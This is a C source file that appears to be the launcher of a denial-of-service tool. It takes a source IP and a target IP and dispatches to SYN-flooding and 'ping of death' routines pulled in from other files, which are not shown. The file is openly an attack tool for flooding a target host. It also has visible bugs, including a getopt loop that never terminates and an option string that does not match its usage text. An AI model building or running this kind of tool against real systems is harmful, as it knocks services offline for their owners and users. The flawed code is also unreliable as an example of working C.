#include <stdio.h>
#include "syn_flooding.c"
#include "ping_flooding_byWork.c"

extern int synflooding(char *csaddr, char *cdaddr);
extern int pingofdeath(char *csaddr, char *cdaddr);

int main(int argc, char *argv[]){
    int opt;
    if(argc != 4){
        printf("Usage: sudo ./DoS [Option] [SourceIP] [DestinationIP]\n");
        printf("Options: -s (SYN_Flooding), -i (Ping of death)\n");
        exit(1);
    }

    while(opt = getopt(argc, argv, "si:")){
        switch(opt){
            case 's':
                synflooding(argv[2], argv[3]);
                break;
            case 'i':
                pingofdeath(argv[2], argv[3]);
                break;
        }
    }
}